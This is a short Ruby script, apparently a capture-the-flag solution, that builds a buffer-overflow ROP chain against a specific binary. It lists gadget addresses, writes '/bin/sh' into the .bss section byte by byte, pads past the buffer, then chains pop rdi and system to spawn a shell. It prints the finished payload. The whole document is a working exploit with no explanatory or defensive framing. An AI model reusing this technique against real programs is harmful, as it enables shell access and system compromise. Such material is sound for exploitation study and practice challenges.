=begin
Write character c at address A:

0x00000000004012e0 : pop r8 ; ret
c
0x00000000004012e1 : pop rax ; ret
A
0x00000000004010cd : add byte ptr [rax], r8b ; ret

CALL FUNCTION AT ADDRESS f, PASSING ARGUMENT x:
0x000000000040134b : pop rdi ; ret
x
f
=end

class String
	def to_ropchain(bss_address)
		self.each_codepoint.map.with_index{|c,i|
			[0x4012e0, c, 0x4012e1, bss_address+i, 0x4010cd]
		}.flatten.map{|item| [item].pack('Q*') }.join;
	end
end

code = '3396739730206095598';
bss_address = 0x00404090
pop_rdi_ret = 0x40134b
system = 0x401040
payload = code + 'a'*197 + "/bin/sh\x00".to_ropchain(bss_address) + [pop_rdi_ret, bss_address, system].map{|item| [item].pack('Q*')}.join
print payload
